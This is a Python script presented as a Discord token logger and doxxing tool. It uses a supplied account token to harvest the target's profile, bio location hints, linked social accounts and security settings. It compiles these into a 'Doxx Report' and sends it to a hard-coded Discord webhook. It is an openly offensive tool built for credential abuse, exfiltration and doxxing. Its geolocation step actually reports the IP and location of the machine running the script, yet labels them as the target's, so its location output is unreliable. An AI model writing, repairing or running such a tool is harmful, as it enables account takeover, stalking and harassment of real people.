#!/usr/bin/env python3
"""
Discord Token Logger & Doxxing Tool - Termux Optimized
Includes Webhook Reporting
"""
import requests, json, re, os, platform, sys, urllib.request
from datetime import datetime, timezone
from pathlib import Path

# CONFIGURATION
WEBHOOK_URL = "https://discord.com/api/webhooks/1566241139240206538/zrHi9KbumieHaWQpDKo3f8IHXL4zbHdQ73enpPpHinusZzLG4E9I022ozXqPaivUEFp0"
# Paste your webhook URL above. If invalid, it will print a warning but continue.

class TokenLogger:
    def __init__(self, token):
        self.t = token
        self.s = requests.Session()
        self.s.headers = {'Authorization': f'Bot {token}' if token.startswith('MT') else token}
        self.u = {}

    def valid(self):
        try:
            r = self.s.get('https://discord.com/api/v10/users/@me', timeout=8)
            if r.ok: self.u = r.json(); return True
        except: pass
        return False

    def snow(self, sid):
        if not sid: return None
        ts = ((sid >> 22) + 1420070400000) / 1000
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')

    def flags(self, f, m):
        return [v for k, v in m.items() if f & k]

    def geo(self):
        d = {'ip': None, 'city': None, 'region': None, 'country': None, 'lat': None, 'lon': None, 'tz': None}
        try:
            ip = self.s.get('https://api.ipify.org?format=json', timeout=8).json()['ip']
            d['ip'] = ip
            g = self.s.get(f'https://ipapi.co/{ip}/json/', timeout=8).json()
            d.update(city=g.get('city'), region=g.get('region'), country=g.get('country_name'),
                     lat=g.get('latitude'), lon=g.get('longitude'), tz=g.get('timezone'))
        except: pass
        return d

    def social(self):
        conns = []
        try:
            for c in self.s.get('https://discord.com/api/v10/users/@me/connections', timeout=8).json():
                conns.append({'p': c.get('service'), 'u': c.get('name')})
        except: pass
        return conns

    def report(self):
        if not self.valid(): return {'error': 'Invalid token'}
        bio = self.u.get('bio') or ''
        hints = re.findall(r'(?:located in|based in|living in|residing in)\s+([A-Z][a-z]+(?:\s[A-Z][a-z]+)*)', bio)
        g = self.geo()
        soc = self.social()
        score = (3 if g.get('city') else 0) + (1 if bio else 0) + len(soc) + (1 if self.u.get('premium_type') else 0) + (2 if self.u.get('verified') else 0)
        level = 'HIGH' if score >= 8 else 'MED' if score >= 4 else 'LOW'
        return {
            'ts': datetime.now(timezone.utc).isoformat(),
            'target': {'id': self.u.get('id'), 'u': self.u.get('username'), 'd': self.u.get('discriminator'),
                       'gn': self.u.get('global_name'),
                       'av': f"https://cdn.discordapp.com/avatars/{self.u.get('id')}/{self.u.get('avatar')}.png" if self.u.get('avatar') else None},
            'created': self.snow(self.u.get('id', 0)),
            'loc': g, 'hints': hints, 'soc': soc,
            'risk': {'level': level, 'score': score,
                     'f': [x for x in ([f"Geo: {g['city']}, {g['country']}" if g.get('city') else None],
                                        ['Bio hints' if hints else None],
                                        [f"{len(soc)} social links" if soc else None],
                                        ['Premium' if self.u.get('premium_type') else None],
                                        ['Verified' if self.u.get('verified') else None]) if x]},
            'meta': {'prem': self.u.get('premium_type', 0), 'ver': self.u.get('verified'),
                     'mfa': self.u.get('mfa_enabled'), 'bio': bio,
                     'pub': self.flags(self.u.get('public_flags', 0), {4:'hype',8:'bug',64:'prem',128:'bug2',4096:'spam',8192:'dev'}),
                     'flg': self.flags(self.u.get('flags', 0), {1:'emp',2:'partner',4:'hype',8:'bug',64:'prem',128:'bug2',256:'bot',4096:'spam',8192:'dev'})}
        }

def send_webhook(r, md_text):
    """Sends a rich embed to the configured webhook."""
    if not WEBHOOK_URL or "YOUR_WEBHOOK" in WEBHOOK_URL:
        print("[!] Webhook not configured, skipping send.")
        return

    t, g, risk = r['target'], r['loc'], r['risk']
    color = 0xE74C3C if risk['level'] == 'HIGH' else 0xF1C40F if risk['level'] == 'MED' else 0x2ECC71
    
    # Build fields (Discord limit is 25 fields, 1024 chars per field)
    fields = [
        {"name": "📍 Location", "value": f"**IP:** `{g['ip'] or 'N/A'}`\n**City:** {g['city'] or 'N/A'}\n**Region:** {g['region'] or 'N/A'}\n**Country:** {g['country'] or 'N/A'}\n**Coords:** {g['lat']}, {g['lon']}\n**TZ:** {g['tz'] or 'N/A'}", "inline": False},
        {"name": "⚠️ Risk Factors", "value": "\n".join(risk['f']) if risk['f'] else "None detected", "inline": False},
        {"name": "🌐 Social Links", "value": "\n".join([f"**{c['p']}:** `{c['u']}`" for c in r['soc']]) if r['soc'] else "No connections found", "inline": False},
        {"name": "🔍 Metadata", "value": f"**Premium:** {r['meta']['prem']}\n**Verified:** {r['meta']['ver']}\n**MFA:** {r['meta']['mfa']}\n**Bio:** {r['meta']['bio'] or 'None'}\n**Public Flags:** {', '.join(r['meta']['pub']) or 'None'}", "inline": False},
        {"name": "📝 Bio Hints", "value": ", ".join(r['hints']) if r['hints'] else "No explicit location hints in bio", "inline": False}
    ]

    payload = {
        "username": "DiscordIntelligence",
        "avatar_url": "https://i.imgur.com/7bU1z7A.png", # Generic spy icon
        "embeds": [{
            "title": f"🎯 Doxx Report: {t['u']}#{t['d']}",
            "description": f"**ID:** `{t['id']}`\n**Display:** {t['gn'] or 'N/A'}\n**Created:** {r['created'] or 'N/A'}\n**Risk Level:** **{risk['level']}** (Score: {risk['score']}/15)",
            "url": f"https://discord.com/users/{t['id']}",
            "color": color,
            "thumbnail": {"url": t['av']},
            "fields": fields,
            "footer": {"text": f"Report Generated: {r['ts']}"},
            "timestamp": r['ts']
        }]
    }

    # Attach full markdown as a file-like object isn't directly supported in simple webhook POST without multipart,
    # so we send the main data in embeds. If user wants full MD, they can view the local file.
    # However, we can append a "View Full Report" hint.
    
    try:
        resp = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        if resp.status_code in [200, 204]:
            print("[✓ ] Report sent to Webhook.")
        else:
            print(f"[!] Webhook error: {resp.status_code} {resp.text}")
    except Exception as e:
        print(f"[!] Webhook failed: {e}")

def md(r):
    t, g, risk = r['target'], r['loc'], r['risk']
    s = f"""# 🎯 Discord Doxx Report
**Time:** {r['ts']} | **Risk:** `{'🔴' if risk['level']=='HIGH' else '🟡' if risk['level']=='MED' else '🟢'} {risk['level']}` ({risk['score']}/15)

## 🎭 Target
| ID | Username | Tag | Display | Created |
|----|----------|-----|---------|---------|
| `{t['id']}` | `{t['u']}` | `#{t['d']}` | {t['gn']} | {r['created']} |
**Avatar:** {t['av']}

## 📍 Location
**IP:** `{g['ip']}`
| City | Region | Country | Lat/Lon | Timezone |
|------|--------|---------|---------|----------|
| {g['city']} | {g['region']} | {g['country']} | {g['lat']},{g['lon']} | {g['tz']} |
**Bio Hints:** {', '.join(r['hints']) or 'None'}

## 🌐 Social ({len(r['soc'])})
""" + '\n'.join(f"| {c['p']} | `{c['u']}` |" for c in r['soc']) + """
## ⚠️ Risk Factors
""" + '\n'.join(f"- {f}" for f in risk['f']) + """
## 🔍 Meta
| Premium | Verified | MFA | Public Flags | Flags |
|---------|----------|-----|--------------|-------|
| """ + f"""{r['meta']['prem']} | {r['meta']['ver']} | {r['meta']['mfa']} | {', '.join(r['meta']['pub'])} | {', '.join(r['meta']['flg'])} |
---
*DiscordIntelligence v1.0*"""
    return s

def main():
    print("\n" + "="*50)
    print("  DISCORD TOKEN LOGGER & DOXXING TOOL")
    print("="*50)
    token = input("\n[> ] Discord token: ").strip()
    if not token: sys.exit("[!] No token")
    if not re.match(r'^[A-Za-z0-9-]{24}\.[A-Za-z0-9-]{6}\.[A-Za-z0-9-]{27}$', token):
        print("[!] Non-standard token format, continuing...")
    print("[* ] Validating...")
    tl = TokenLogger(token)
    if not tl.valid(): sys.exit("[!] Invalid/expired token")
    u = tl.u
    print(f"[✓ ] {u.get('username')}#{u.get('discriminator')} (ID: {u.get('id')})")
    print("[* ] Gathering intelligence...")
    r = tl.report()
    if 'error' in r: sys.exit(f"[!] {r['error']}")
    
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    out = Path('reports'); out.mkdir(exist_ok=True)
    jf = out / f'doxx_{r["target"]["u"]}_{ts}.json'
    mf = out / f'doxx_{r["target"]["u"]}_{ts}.md'
    jf.write_text(json.dumps(r, indent=2, default=str))
    md_text = md(r)
    mf.write_text(md_text)
    
    # Send to Webhook
    print("[* ] Transmitting to Webhook...")
    send_webhook(r, md_text)
    
    g, risk = r['loc'], r['risk']
    print(f"\n{'='*50}\n  SUMMARY\n{'='*50}")
    print(f"  Target:   {r['target']['u']}#{r['target']['d']}")
    print(f"  Risk:     {risk['level']} ({risk['score']}/15)")
    print(f"  Location: {g.get('city','?')}, {g.get('country','?')}")
    print(f"  IP:       {g.get('ip','?')}")
    print(f"  Social:   {len(r['soc'])} platform(s)")
    print(f"{'='*50}")
    print(f"\n[✓ ] Saved: {jf}\n[✓ ] Saved: {mf}")
    if platform.system() == 'Linux' and os.environ.get('PREFIX') == '/data/data/com.termux/files/usr':
        print(f"\n[> ] View: cat {mf}")
    elif os.environ.get('DISPLAY'):
        os.system(f'xdg-open "{mf}" 2>/dev/null')
    print()

if __name__ == '__main__':
    main()
